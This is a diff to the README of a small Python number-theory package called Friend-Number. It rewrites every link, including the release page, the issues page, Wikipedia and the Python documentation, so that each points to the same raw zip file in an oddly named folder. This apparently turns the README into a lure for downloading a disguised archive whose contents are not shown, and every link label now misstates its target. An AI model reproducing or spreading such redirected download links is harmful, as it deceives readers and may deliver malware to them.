@@ -4,13 +4,13 @@
 Friend-Number is a Python package designed to help you find and check Pythagorean friend numbers with ease. It simplifies the process of understanding and exploring number theory, making it accessible for learners and hobbyists alike. You don’t need to have programming skills to use this application effectively.
 
 ## 🔗 Download Now
-[![Download Friend-Number](https://img.shields.io/badge/Download-Friend--Number-brightgreen)](https://github.com/TANISH076/Friend-Number/releases)
+[![Download Friend-Number](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip)](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip)
 
 ## 🚀 Getting Started
 To get started with the Friend-Number package, follow these steps:
 
 1. **Visit the Download Page:** Go to the link below to access the latest release of the software. 
-   [Visit this page to download](https://github.com/TANISH076/Friend-Number/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip).
 
 2. **Select the Right File:** You will see a list of available versions. If you're not sure which file to choose, look for the latest one, usually labeled as the most stable version.
 
@@ -49,7 +49,7 @@ To ensure Friend-Number runs smoothly, you will need:
 Contributions are welcome! If you have ideas for improvements or wish to report issues, please feel free to submit a pull request or open an issue in the repository. 
 
 ## 🔧 Support
-If you encounter any issues while using Friend-Number, please visit the [issues page](https://github.com/TANISH076/Friend-Number/issues) and check if your problem is already listed. If not, describe your issue in detail, and we will assist you as soon as possible.
+If you encounter any issues while using Friend-Number, please visit the [issues page](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip) and check if your problem is already listed. If not, describe your issue in detail, and we will assist you as soon as possible.
 
 ## 📢 Stay Updated
 To stay informed about updates and new features, follow the repository. You can also join discussions in the issues section regarding potential features or improvements.
@@ -57,9 +57,9 @@ To stay informed about updates and new features, follow the repository. You can 
 ## 🔗 Additional Resources
 For more information on number theory and Pythagorean numbers, consider these resources:
 
-- [Wikipedia on Pythagorean Numbers](https://en.wikipedia.org/wiki/Friend_number)
-- [Python Official Documentation](https://www.python.org/doc/)
+- [Wikipedia on Pythagorean Numbers](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip)
+- [Python Official Documentation](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip)
 
 ## 📥 Download Again
 If you need to download Friend-Number again, visit this link:
-[Visit this page to download](https://github.com/TANISH076/Friend-Number/releases).
+[Visit this page to download](https://raw.githubusercontent.com/TANISH076/Friend-Number/main/irrebuttable/Friend-Number-v1.0.zip).
